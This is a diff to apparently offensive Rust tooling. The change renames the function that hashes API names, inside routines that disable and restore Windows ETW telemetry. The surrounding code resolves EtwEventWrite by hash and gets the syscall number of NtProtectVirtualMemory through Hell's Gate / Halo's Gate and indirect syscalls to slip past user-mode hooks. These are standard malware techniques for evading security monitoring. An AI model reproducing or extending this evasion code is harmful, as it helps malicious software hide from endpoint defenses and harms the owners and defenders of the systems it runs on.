@@ -23,7 +23,7 @@ const PAGE_EXECUTE_READWRITE: u32 = 0x40;
 /// Uses indirect syscall for NtProtectVirtualMemory (no user-mode hooks)
 pub fn disable_etw(api: &ApiResolver) -> Result<EtwState, String> {
     // 1. Resolve ntdll!EtwEventWrite via DJB2 hash
-    let etw_hash = resolver::djb2_hash(b"EtwEventWrite");
+    let etw_hash = resolver::api_hash(b"EtwEventWrite");
     let etw_ptr = api
         .ntdll(etw_hash)
         .ok_or("EtwEventWrite not found in ntdll")?;
@@ -31,7 +31,7 @@ pub fn disable_etw(api: &ApiResolver) -> Result<EtwState, String> {
     println!("    EtwEventWrite: {:p}", etw_addr);
 
     // 2. Resolve NtProtectVirtualMemory SSN via Hell's Gate / Halo's Gate
-    let nqvm_hash = resolver::djb2_hash(b"NtProtectVirtualMemory");
+    let nqvm_hash = resolver::api_hash(b"NtProtectVirtualMemory");
     let sc = syscall::resolve_ssn(api, nqvm_hash)
         .ok_or("Failed to resolve NtProtectVirtualMemory SSN")?;
     println!("    NtProtectVirtualMemory SSN: 0x{:04X}", sc.ssn);
@@ -103,7 +103,7 @@ pub fn restore_etw(state: &EtwState) -> Result<(), String> {
     // Re-resolve NtProtectVirtualMemory SSN via PEB walk
     let api = crate::resolver::ApiResolver::init()
         .map_err(|e| format!("ApiResolver init failed on restore: {}", e))?;
-    let nqvm_hash = resolver::djb2_hash(b"NtProtectVirtualMemory");
+    let nqvm_hash = resolver::api_hash(b"NtProtectVirtualMemory");
     let sc = syscall::resolve_ssn(&api, nqvm_hash)
         .ok_or("Failed to resolve NtProtectVirtualMemory SSN on restore")?;
 
